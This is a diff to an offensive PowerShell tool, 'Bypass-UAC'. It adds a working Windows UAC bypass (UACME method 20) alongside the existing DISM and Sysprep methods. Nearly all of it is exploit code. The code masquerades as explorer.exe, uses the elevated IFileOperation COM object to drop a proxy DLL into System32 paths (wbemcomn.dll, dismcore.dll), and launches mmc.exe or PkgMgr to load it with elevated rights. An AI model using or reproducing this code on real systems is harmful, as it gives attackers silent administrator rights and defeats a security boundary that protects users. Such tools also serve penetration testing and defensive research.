@@ -19,6 +19,7 @@ Process Status API (PSAPI) which reads the process PEB.
 
 + UacMethodSysprep: x32/x64 Win7-Win8
 + ucmDismMethod: x64 Win7+ (unpatched, tested up to 10RS2 14926)
++ UacMethodMMC2: x64 Win7+ (unpatched, tested up to 10RS2 14926)
 
 .DESCRIPTION
 Author: Ruben Boonen (@FuzzySec)
@@ -43,7 +44,7 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
 #>
 	param(
         [Parameter(Mandatory = $True)]
-        [ValidateSet('UacMethodSysprep','ucmDismMethod')]
+        [ValidateSet('UacMethodSysprep','ucmDismMethod','UacMethodMMC2')]
         [String]$Method,
         [Parameter(Mandatory = $False)]
         [String]$CustomDll = $null
@@ -1294,11 +1295,10 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
         echo "`n[!] Sorry, this OS version is not supported!`n"
         Return
     }
-    
+
     # Bool flag architecture $x64/!$x64
     $x64 = $($env:PROCESSOR_ARCHITECTURE -eq "AMD64")
-    
-    
+
     # UAC bypass methods go here!
     switch ($Method) {
         # UACME method 1
@@ -1310,7 +1310,7 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
                 echo "[!] Your OS does not support this method!`n"
                 Return
             }
-        
+
             # Impersonate explorer.exe
             echo "`n[!] Impersonating explorer.exe!"
             Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
@@ -1326,14 +1326,14 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
 
             # Expose IFileOperation COM object
             Invoke-IFileOperation
-        
+
             # Exploit logic
             echo "[>] Performing elevated IFileOperation::MoveItem operation.."
             $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\System32\sysprep\'), "cryptbase.dll")
             $IFileOperation.PerformOperations()
             echo "`n[?] Executing sysprep.."
             IEX $($env:SystemRoot + '\System32\sysprep\sysprep.exe')
-        
+
             # Clean-up
             echo "[!] UAC artifact: $($env:SystemRoot + '\System32\sysprep\cryptbase.dll')`n"
         }
@@ -1350,7 +1350,53 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
                 echo "[!] This method is only supported on 64-bit!`n"
                 Return
             }
-        
+
+            # Impersonate explorer.exe
+            echo "`n[!] Impersonating explorer.exe!"
+            Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
+
+            if ($DllPath) {
+                echo "[>] Using custom proxy dll.."
+                echo "[+] Dll path: $DllPath"
+            } else {
+                # Write Yamabiko.dll to disk
+                echo "[>] Dropping proxy dll.."
+                Emit-Yamabiko
+            }
+
+            # Write package XML to disk
+            $PackagePath = $env:Temp + "\pac$(Get-Random).xml"
+            echo "[>] Creating XML trigger: $PackagePath"
+            $WinPackageData > $PackagePath
+
+            # Expose IFileOperation COM object
+            Invoke-IFileOperation
+
+            # Exploit logic
+            echo "[>] Performing elevated IFileOperation::MoveItem operation.."
+            $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\System32\'), "dismcore.dll")
+            $IFileOperation.PerformOperations()
+            echo "`n[?] Executing PkgMgr.."
+            IEX $($env:SystemRoot + '\System32\PkgMgr.exe /n:' + $PackagePath)
+
+            # Clean-up
+            echo "[!] UAC artifact: $($env:SystemRoot + '\System32\dismcore.dll')"
+            echo "[!] UAC artifact: $PackagePath`n"
+        }
+
+        # UACME method 20
+        'UacMethodMMC2'
+        {
+            # Hybrid MMC method: mmc -> rsop.msc -> wbemcomn.dll
+            # Works on x64 Win7-Win10 (unpatched)
+            if ($OSMajorMinor -lt 6.1) {
+                echo "[!] Your OS does not support this method!`n"
+                Return
+            } if (!$x64) {
+                echo "[!] This method is only supported on 64-bit!`n"
+                Return
+            }
+
             # Impersonate explorer.exe
             echo "`n[!] Impersonating explorer.exe!"
             Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
@@ -1363,25 +1409,19 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
                 echo "[>] Dropping proxy dll.."
                 Emit-Yamabiko
             }
-        
-            # Write package XML to disk
-            $PackagePath = $env:Temp + "\pac$(Get-Random).xml"
-            echo "[>] Creating XML trigger: $PackagePath"
-            $WinPackageData > $PackagePath
-        
+
             # Expose IFileOperation COM object
             Invoke-IFileOperation
-        
+
             # Exploit logic
             echo "[>] Performing elevated IFileOperation::MoveItem operation.."
-            $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\System32\'), "dismcore.dll")
+            $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\System32\wbem\'), "wbemcomn.dll")
             $IFileOperation.PerformOperations()
-            echo "`n[?] Executing PkgMgr.."
-            IEX $($env:SystemRoot + '\System32\PkgMgr.exe /n:' + $PackagePath)
-        
+            echo "`n[?] Executing mmc.."
+            IEX $($env:SystemRoot + '\System32\mmc.exe rsop.msc')
+
             # Clean-up
-            echo "[!] UAC artifact: $($env:SystemRoot + '\System32\dismcore.dll')"
-            echo "[!] UAC artifact: $PackagePath`n"
+            echo "[!] UAC artifact: $($env:SystemRoot + '\System32\wbem\wbemcomn.dll')`n"
         }
     }
 }
